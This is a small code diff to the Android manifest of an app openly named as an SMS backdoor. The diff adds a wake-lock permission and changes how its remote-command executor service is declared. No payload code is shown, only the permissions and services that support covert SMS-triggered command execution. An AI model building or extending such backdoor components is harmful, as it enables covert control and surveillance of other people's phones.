@@ -1,8 +1,9 @@
 <manifest xmlns:android="http://schemas.android.com/apk/res/android"
     package="com.evilthreads.smsbackdoor">
     <uses-permission android:name="android.permission.RECEIVE_SMS" />
+    <uses-permission android:name="android.permission.WAKE_LOCK" />
     <application>
         <service android:name=".BackdoorService" android:directBootAware="true"/>
-        <service android:name=".RemoteCommandExecutor" android:exported="false" />
+    <service android:name=".RemoteCommandExecutor" android:permission="android.permission.BIND_JOB_SERVICE" />
     </application>
 </manifest>
